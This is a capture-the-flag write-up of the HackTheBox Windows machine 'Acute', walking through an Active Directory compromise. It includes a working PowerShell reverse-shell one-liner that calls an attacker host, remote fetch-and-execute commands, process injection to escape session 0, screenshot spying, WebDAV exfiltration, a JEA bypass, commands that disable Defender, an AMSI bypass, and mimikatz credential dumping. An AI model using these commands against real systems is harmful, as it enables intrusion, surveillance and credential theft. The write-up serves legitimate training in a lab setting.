---
categories:
- CTF
image:
  path: htb_acute_slide.png
layout: post
media_subpath: /assets/posts/2022-07-16-active-directory-jea-random-stuff-acute-hackthebox
tags:
- active directory
- hackthebox
- windows
title: "Active Directory, JEA & Random Stuff \u2013 Acute @ HackTheBox"
---

Acute is a 40-point Active Directory Windows machine on HackTheBox. I’m going to use it to show some techniques which can be useful in other scenarios and keep it short on the things that are not that important.

## User

### Foothold

We visit <https://atsserver.acute.local> and find a company page. On the about page there is a list of usernames: Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins. There is also a .docx file linked on the page which we download & read. This has a link to [https://atsserver.acute.local/Acute\_Staff\_Access](https://atsserver.acute.local/Acute_Staff_Access) and mentions a default password "Password1!". On `/Acute_Staff_Access` we have a powershell remoting web console. At this point we have to come up with a username scheme the company might use and spray the password against all of the potential usernames.

This will eventually lead to a valid login: Username: "acute\\edavies", Password: "Password1!", Computername: "Acute-PC01". Now we have a WinRM shell on the Acute-PC01 and can continue to explore it. Because I don’t like this web shell we are upgrading it to a remote interactive shell:

```
PS C:\Users\edavies\Documents> iex(iwr http://10.10.14.7/run.txt -usebasicparsing)
...
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.145] 49835
[>] whoami
acute\edavies
```

Contents of run.txt:

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.7",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "[>] ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

By looking at the running processes, we can see a lot of session 1 processes, including Edge, which means that besides us, the user edavies is also logged on locally on the system. We can also confirm this via `qwinsta`:

```
[>] ps
...
908      43    22492      66556       4.75   1544   1 msedge
309      18    97720      23976       0.41   3732   1 msedge
205      14     6832      16952       0.25   4108   1 msedge
245      15     8476      24576       0.56   4932   1 msedge
135       9     1924       6552       0.03   5048   1 msedge
...
[>] qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 console           edavies                   1  Active
```

### Session 0 Isolation says Hello

As we are connected via PSRemoting/WinRM we are running in session 0 and as such we can not interact with the logged in users desktop ([Sessions in Windows](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)). This comes with many restrictions and we can not really get an idea what the user is doing on his desktop. We run a reverse shell via [rcat ](https://github.com/xct/rcat)and confirm that our shell is in session 0:

```
[>] iwr http://10.10.14.7/drop/rcat.exe -outfile
[>] C:\windows\temp\rcat_10.10.14.7_1337.exe 
...
nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.145] 49880
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\temp> ps | findstr rcat
257       6      844       3544       0.00   5376   0 rcat_10.10.14.7_1337
```

One way to get out of session 0 is to inject into a process with a higher session id. This is only possible if we have either `SeDebugPrivilege` or the other process belongs to the same user (which is the case here). In the past you could inject shellcode and run it, but at this point all windows binaries are compiled with Control Flow Guard (CFG) so doing an indirect jump to shellcode is not allowed. To get around that, we will have to use a function that is already loaded and whitelisted. A common way to achive that, is to inject a DLL with LoadLibrary because this one is usually loaded & therefore will not cause any issues with CFG. It also has exactly one argument which is all we have when we want to use CreateRemoteThread to run code in a remote process.

In this case I decided to come up with a custom way that does not involve loading a DLL. If we look at the imports of explorer.exe we can see that it imports [ShellExecuteExW ](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)from user32.dll:

```
BOOL ShellExecuteExW(
  [in, out] SHELLEXECUTEINFOW *pExecInfo
);
```

This function is pretty much ideal: It has exactly one argument (just like LoadLibrary) and allows to run any binary on disk. So in the end I ended up finding where the address of ShellExecuteExW is loaded at in explorer.exe, allocated the required argument structure inside explorer.exe and used WriteProcessMemory to copy it into the explorer.exe process. Finally a call to CreateRemoteThread pointing to ShellExecuteW and the argument structure allows us to execute an arbitrary executeable. This is implemented in [adopt](https://github.com/xct/adopt).

So with this out of the way, we can continue to spawn a Session 1 process, using explorer.exe as a trampoline. We confirm that the new shell is indeed in session 1:

```
[>] iwr http://10.10.14.7/drop/adopt.exe -outfile C:\windows\temp\adopt.exe
[>] \windows\temp\adopt.exe explorer.exe c:\\windows\\temp\\rcat_10.10.14.7_1337.exe
...
nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.145] 49820
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6
Windows PowerShell

PS C:\temp> ps | findstr rcat
ps | findstr rcat
     73       6      856       3552       0.03   5856   1 rcat_10.10.14.7_1337
```

### Spying on the user

Now we can interact with the users desktop, including start new desktop allocations or taking screenshots. I will take a couple of screenshots to get an idea on what the user is doing. This also lead me down a rabbit hole and I ended up coming with [scr](https://github.com/xct/scr). This command line tool just takes a screenshot as "scr.jpg" . In order to get a few of those I run a simple loop, rename them & finally zip them up:

```
iwr http://10.10.14.7/drop/scr.exe -outfile C:\temp\scr.exe
1..10 | % { \temp\scr.exe; start-sleep -s 3; rename-item "scr.jpg" "scr-$_.jpg" }; Compress-Archive -Path *.jpg -DestinationPath scr.zip
```

Now copying out the files could be done with something like metasploit or [xc ](https://github.com/xct/xc) but I got this far without them so lets try something else ;) We are going to use WebDAV to copy those to our attacker machine. There is a cool [repo ](https://github.com/qtc-de/container-arsenal) by [qtc ](https://twitter.com/qtc_de)that allows to start nginx with webdav support in a docker container among other things, which I’m going to use here:

```
car run nginx
[+] Environment Variables:
[+]	car_local_uid                 1000
[+]	car_nginx_folder              /home/xct/arsenal/nginx
[+]	car_download_folder           /home/xct/arsenal/nginx/download
[+]	car_upload_folder             /home/xct/arsenal/nginx/upload
[+]	car_http_port                 80
[+]	car_https_port                443
[+]
[+] Running: sudo -E docker-compose up
Starting car.nginx ... done
Attaching to car.nginx
car.nginx    | [+] Adjusting UID values.
car.nginx    | [+] Adjusting volume permissions.
car.nginx    | [+] No password was specified.
car.nginx    | [+] Generated random password: SfGrc6Y2
car.nginx    | [+] Creating .htpasswd file.
car.nginx    | [+] WebDAV access allowed for default:SfGrc6Y2
car.nginx    | [+] Starting nginx daemon.
```

Now we can use PowerShell to `PUT` the file onto our system:

```
$auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f "default","SfGrc6Y2")))
Invoke-RestMethod -Headers @{Authorization=("Basic {0}" -f $auth)} -Uri "http://10.10.14.7/upload/scr.zip" -Method Put -InFile "C:\temp\scr.zip"  
```

We look at our screenshot collection and can see that the user is using PowerShell trying to connect to a remote system. We copy the commands from the screenshot (by hand) and can connect to the remote system:

```
$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("acute\imonks",$passwd)
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -scriptblock { Get-Command }
...
CommandType     Name                                               Version    Source               PSComputerName
-----------     ----                                               -------    ------               --------------
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Get-ChildItem                                      3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Get-Command                                        3.0.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Get-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Get-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Set-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Set-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER
Cmdlet          Write-Output                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER
```

Note that the last command specifies `ConfigurationName` which means that [JEA](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.2) is used here and we are limited in what we can run. A common bypass for JEA is to define a custom function and run it, which are doing:

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { function xct { iex(iwr http://10.10.14.7/run.txt -usebasicparsing) };xct }
```

This gets us a reverse shell on the DC and allows us to read the user flag on `imonk`‘s desktop.

```
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.145] 52904
[>] hostname
ATSSERVER
[>] whoami
acute\imonks
```

## Root

Another file on the desktop of imonk is wm.ps1, where we just have to modify the command to go back to Acute-PC01 with administrator privileges:

```
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock { iex(iwr http://10.10.14.7/run.txt -usebasicparsing) } -ComputerName Acute-PC01 -Credential $creds
...
[>] whoami
acute\jmorgan
[>] whoami /groups
...
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
```

We can now disable AV & use mimikatz to dump the hashes on the system:

```
Add-MpPreference -ExclusionPath C:\temp
Set-MpPreference -DisableRealtimeMonitoring $true
iwr http://10.10.14.7/drop/mimikatz.exe -outfile mimikatz.exe

# bypass AMSI
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
.\mimikatz.exe "token::elevate"  "lsadump::sam" "exit"
...
ACUTE-PC01$:   ea9815114ac78cdbb69ab9a39df66d73
Natasha:       29ab86c5c4d2aab957763e5c1720486d
Administrator: a29f7623fd11550def0192de9246f46b (cracks to Password@123)
```

The rest of the machine is not that interesting anymore, the local administrator password on Acute-PC01 is reused on another user `awallace`. Then we get a shell on the DC with that user & place a .bat file in the `C:\Program files\keepmeon` folder which is periodically executed as `lhopkins` which has `Generic Write` to to the `Site_Admin` group which in turn has DA access. At this point you can add any of your already compromised users to that group (e.g. `net group "Site_Admin" awallace /add` and are done.